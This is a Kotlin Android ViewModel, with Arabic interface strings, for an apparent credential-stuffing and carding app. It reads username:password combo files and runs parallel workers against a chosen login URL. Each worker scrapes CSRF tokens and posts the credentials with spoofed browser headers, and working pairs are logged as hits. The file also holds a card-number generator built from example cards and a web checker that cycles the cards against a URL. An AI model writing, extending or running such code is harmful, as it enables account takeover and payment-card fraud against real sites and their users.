package com.example

import android.content.ContentResolver
import android.net.Uri
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

data class LogItem(
    val id: Int,
    val timestamp: String,
    val info: String,
    val status: String // SUCCESS, FAILED, RETRY, ERROR
)

data class Stats(
    val hit: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val total: Int = 0
)

data class CheckerState(
    val loginUrl: String = "",
    val separator: String = ":",
    val delaySeconds: Int = 1,
    val threadCount: Int = 1,
    val selectedFileName: String = "لم يتم اختيار ملف",
    val selectedFileUri: Uri? = null,
    val isRunning: Boolean = false,
    val isPaused: Boolean = false,
    val stats: Stats = Stats(),
    val logs: List<LogItem> = emptyList(),
    val latestResponseHtml: String = ""
)

data class GeneratorState(
    val exampleCards: String = "",
    val count: String = "10",
    val generatedCards: String = "",
    val errorMessage: String? = null
)

data class WebCheckerState(
    val cardsToCheck: String = "",
    val checkUrl: String = "",
    val delaySeconds: String = "3",
    val isChecking: Boolean = false,
    val currentIndex: Int = 0,
    val currentCard: String = "",
    val totalCount: Int = 0
)

class CheckerViewModel : ViewModel() {
    private val _state = MutableStateFlow(CheckerState())
    val state: StateFlow<CheckerState> = _state.asStateFlow()

    private val _genState = MutableStateFlow(GeneratorState())
    val genState: StateFlow<GeneratorState> = _genState.asStateFlow()

    private val _webState = MutableStateFlow(WebCheckerState())
    val webState: StateFlow<WebCheckerState> = _webState.asStateFlow()

    private val patternAnalyzer = PatternAnalyzer()
    private var webJob: Job? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private var checkingJob: Job? = null
    private var pausedFlag = false
    private var stopFlag = false

    private val logsMutex = Mutex()
    private val statsMutex = Mutex()
    private var logCounter = AtomicInteger(0)

    private var accountsQueue = mutableListOf<String>()
    private val queueMutex = Mutex()

    fun updateUrl(url: String) = _state.update { it.copy(loginUrl = url) }
    fun updateSeparator(sep: String) = _state.update { it.copy(separator = sep) }
    fun updateDelay(delay: Int) = _state.update { it.copy(delaySeconds = delay) }
    fun updateThreadCount(count: Int) = _state.update { it.copy(threadCount = count) }
    fun fileSelected(uri: Uri, name: String) = _state.update {
        it.copy(selectedFileUri = uri, selectedFileName = name)
    }

    suspend fun testConnection(): String {
        return withContext(Dispatchers.IO) {
            try {
                val url = _state.value.loginUrl
                if(url.isEmpty()) return@withContext "رابط فارغ"
                val request = Request.Builder().url(url).head().build()
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) "تم الاتصال بنجاح (HTTP ${response.code})"
                    else "فشل الاتصال (HTTP ${response.code})"
                }
            } catch (e: Exception) {
                "خطأ: ${e.localizedMessage}"
            }
        }
    }

    fun startChecking(contentResolver: ContentResolver) {
        val currentState = _state.value
        if (currentState.isRunning || currentState.selectedFileUri == null || currentState.loginUrl.isEmpty()) return

        stopFlag = false
        pausedFlag = false

        _state.update {
            it.copy(
                isRunning = true,
                isPaused = false,
                stats = Stats(),
                logs = emptyList() // Clear previous logs
            )
        }
        logCounter.set(0)

        checkingJob = viewModelScope.launch(Dispatchers.IO) {
            // Read lines
            try {
                accountsQueue.clear()
                contentResolver.openInputStream(currentState.selectedFileUri)?.use { inputStream ->
                    val reader = BufferedReader(InputStreamReader(inputStream))
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        if (line!!.isNotBlank()) accountsQueue.add(line!!)
                    }
                }
            } catch (e: Exception) {
                addLog("خطأ في الملف: ${e.localizedMessage}", "ERROR")
                stopCheckingInternal()
                return@launch
            }

            // Launch workers
            val workers = List(currentState.threadCount) { workerId ->
                launch { workerRoutine(workerId) }
            }
            
            workers.joinAll()

            // When all done:
            withContext(Dispatchers.Main) {
                stopCheckingInternal()
                addLog("اكتمل الفحص.", "INFO")
            }
        }
    }

    private suspend fun workerRoutine(workerId: Int) {
        while (currentCoroutineContext().isActive && !stopFlag) {
            if (pausedFlag) {
                delay(500)
                continue
            }

            val account = queueMutex.withLock {
                if (accountsQueue.isEmpty()) null else accountsQueue.removeAt(0)
            } ?: break

            checkAccount(account)

            // Dynamic delay applied per worker
            delay(_state.value.delaySeconds * 1000L)
        }
    }

    private suspend fun checkAccount(line: String) {
        val currentState = _state.value
        val sep = if (currentState.separator == "Tab") "\t" else currentState.separator
        val parts = line.split(sep, limit = 2)

        if (parts.size < 2) {
            updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
            addLog("تنسيق غير صالح: $line", "FAILED")
            return
        }

        val username = parts[0].trim()
        val password = parts[1].trim()

        try {
            // 1. Prepare isolated CookieJar for this worker to maintain session
            val cookieJar = object : okhttp3.CookieJar {
                 private val cookieStore = mutableListOf<okhttp3.Cookie>()
                 override fun saveFromResponse(url: okhttp3.HttpUrl, cookies: List<okhttp3.Cookie>) {
                     cookieStore.addAll(cookies)
                 }
                 override fun loadForRequest(url: okhttp3.HttpUrl): List<okhttp3.Cookie> {
                     return cookieStore
                 }
            }

            val workerClient = client.newBuilder().cookieJar(cookieJar).build()
            
            // 2. GET Request to fetch CSRF token and session cookies
            var csrfTokenName = ""
            var csrfTokenValue = ""
            
            val getRequest = Request.Builder()
                .url(currentState.loginUrl)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
                .get()
                .build()
                
            workerClient.newCall(getRequest).execute().use { getResponse ->
                val getBody = getResponse.body?.string() ?: ""
                
                // Advanced CSRF Extraction using Regex
                val csrfRegexes = listOf(
                    """name=["']?_csrf["']?\s+value=["']?([^"']+)["']?""".toRegex(),
                    """name=["']?csrf_token["']?\s+value=["']?([^"']+)["']?""".toRegex(),
                    """name=["']?csrfmiddlewaretoken["']?\s+value=["']?([^"']+)["']?""".toRegex(),
                    """name=["']?authenticity_token["']?\s+value=["']?([^"']+)["']?""".toRegex(),
                    """<meta\s+name=["']?csrf-token["']?\s+content=["']?([^"']+)["']?""".toRegex()
                )

                for (regex in csrfRegexes) {
                    val match = regex.find(getBody)
                    if (match != null) {
                        csrfTokenValue = match.groupValues[1]
                        
                        // Infer token name field from the matched content broadly
                        val contextMatch = """name=["']?([^"']+)["']?\s+value=["']?${Regex.escape(csrfTokenValue)}["']?""".toRegex().find(getBody)
                        if (contextMatch != null && contextMatch.groupValues[1] != "username" && contextMatch.groupValues[1] != "password") {
                            csrfTokenName = contextMatch.groupValues[1]
                        } else {
                            // Default mapping based on occurrence
                            if (getBody.contains("csrfmiddlewaretoken")) csrfTokenName = "csrfmiddlewaretoken"
                            else if (getBody.contains("authenticity_token")) csrfTokenName = "authenticity_token"
                            else if (getBody.contains("_csrf")) csrfTokenName = "_csrf"
                            else csrfTokenName = "csrf_token"
                        }
                        break
                    }
                }
            }

            // 3. POST Request with user data and extracted CSRF
            val formBuilder = FormBody.Builder()
                .add("username", username)
                .add("password", password)
                
            // Fallback for sites using 'email' instead of 'username'
            formBuilder.add("email", username)

            if (csrfTokenName.isNotEmpty() && csrfTokenValue.isNotEmpty()) {
                formBuilder.add(csrfTokenName, csrfTokenValue)
                addLog("CSRF Extracted: $csrfTokenName = ...", "INFO")
            }

            val requestBody = formBuilder.build()

            val postRequest = Request.Builder()
                .url(currentState.loginUrl)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
                // Added headers to mimic real browser behavior
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Origin", currentState.loginUrl)
                .header("Referer", currentState.loginUrl)
                .post(requestBody)
                .build()

            workerClient.newCall(postRequest).execute().use { response ->
                val responseStr = response.body?.string() ?: ""
                
                // Update latest HTML response for the UI live page
                _state.update { it.copy(latestResponseHtml = responseStr) }
                
                // Detection heuristics: Real sites will return 200/302. Failures often contain text indicating wrong credentials.
                val lowStr = responseStr.lowercase()
                val isFailedWord = lowStr.contains("invalid") || lowStr.contains("incorrect") || lowStr.contains("wrong") || lowStr.contains("فشل") || lowStr.contains("غير صحيح")
                val isSuccessWord = lowStr.contains("dashboard") || lowStr.contains("welcome") || lowStr.contains("logout") || lowStr.contains("مرحبا")
                
                // If it's a redirect, that's often a successful login indicator.
                val isRedirect = response.code in 301..303
                
                val isSuccess = (response.isSuccessful && !isFailedWord) || isSuccessWord || (isRedirect && !isFailedWord)

                when {
                    isSuccess -> {
                        updateStats { it.copy(hit = it.hit + 1, total = it.total + 1) }
                        addLog("$username:$password", "SUCCESS")
                    }
                    response.code in 400..403 || isFailedWord -> {
                        updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
                        addLog(username, "FAILED")
                    }
                    response.code == 429 || response.code >= 500 -> {
                        updateStats { it.copy(retry = it.retry + 1, total = it.total + 1) }
                        addLog(username, "RETRY")
                    }
                    else -> {
                        updateStats { it.copy(unknown = it.unknown + 1, total = it.total + 1) }
                        addLog(username, "UNKNOWN")
                    }
                }
            }
        } catch (e: Exception) {
            updateStats { it.copy(unknown = it.unknown + 1, total = it.total + 1) }
            addLog("$username - خطأ: ${e.message}", "ERROR")
        }
    }

    private suspend fun updateStats(transform: (Stats) -> Stats) {
        statsMutex.withLock {
            _state.update { it.copy(stats = transform(it.stats)) }
        }
    }

    private suspend fun addLog(info: String, status: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val item = LogItem(
            id = logCounter.incrementAndGet(),
            timestamp = time,
            info = info,
            status = status
        )
        logsMutex.withLock {
            _state.update {
                // Keep the last 1000 items to avoid unhandled memory growth in UI
                val newLogs = it.logs.toMutableList()
                newLogs.add(item)
                if (newLogs.size > 1000) newLogs.removeAt(0)
                it.copy(logs = newLogs)
            }
        }
    }

    fun pauseChecking() {
        if (_state.value.isRunning) {
            pausedFlag = true
            _state.update { it.copy(isPaused = true) }
        }
    }

    fun resumeChecking() {
        if (_state.value.isRunning && pausedFlag) {
            pausedFlag = false
            _state.update { it.copy(isPaused = false) }
        }
    }

    fun stopChecking() {
        stopFlag = true
        stopCheckingInternal()
    }

    private fun stopCheckingInternal() {
        checkingJob?.cancel()
        _state.update { it.copy(isRunning = false, isPaused = false) }
    }

    // --- Generator Functions ---
    fun updateExampleCards(text: String) { _genState.update { it.copy(exampleCards = text) } }
    fun updateGenCount(count: String) { _genState.update { it.copy(count = count) } }
    
    fun generateCards() {
        try {
            val examples = _genState.value.exampleCards.lines().filter { it.isNotBlank() }.map { it.trim() }
            if (examples.isEmpty()) {
                _genState.update { it.copy(errorMessage = "يرجى إدخال 1 مثال على الأقل.") }
                return
            }
            val count = _genState.value.count.toIntOrNull() ?: 10
            val generated = patternAnalyzer.generateCards(examples, count)
            _genState.update { it.copy(generatedCards = generated.joinToString("\n"), errorMessage = null) }
        } catch (e: Exception) {
            _genState.update { it.copy(errorMessage = e.message) }
        }
    }
    
    fun setWebCheckerCards(cards: String) {
        _webState.update { it.copy(cardsToCheck = cards) }
    }
    
    // --- Web Checker Functions ---
    fun updateWebUrl(url: String) { _webState.update { it.copy(checkUrl = url) } }
    fun updateWebCards(cards: String) { _webState.update { it.copy(cardsToCheck = cards) } }
    fun updateWebDelay(delay: String) { _webState.update { it.copy(delaySeconds = delay) } }
    
    fun startWebChecking() {
        if (_webState.value.isChecking) return
        val cardsList = _webState.value.cardsToCheck.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (cardsList.isEmpty() || _webState.value.checkUrl.isBlank()) return
        
        val delaySecs = _webState.value.delaySeconds.toLongOrNull() ?: 3L
        
        _webState.update { 
            it.copy(
                isChecking = true, 
                totalCount = cardsList.size, 
                currentIndex = 0,
                currentCard = cardsList.firstOrNull() ?: ""
            ) 
        }
        
        webJob = viewModelScope.launch(Dispatchers.Main) { 
            for (i in cardsList.indices) {
                if (!isActive) break
                val card = cardsList[i]
                _webState.update { it.copy(currentIndex = i + 1, currentCard = card) }
                
                // WebView UI will observe currentCard and URL and load automatically
                delay(delaySecs * 1000)
            }
            _webState.update { it.copy(isChecking = false, currentCard = "تم الانتهاء من الفحص.") }
        }
    }
    
    fun stopWebChecking() {
        webJob?.cancel()
        _webState.update { it.copy(isChecking = false) }
    }
}

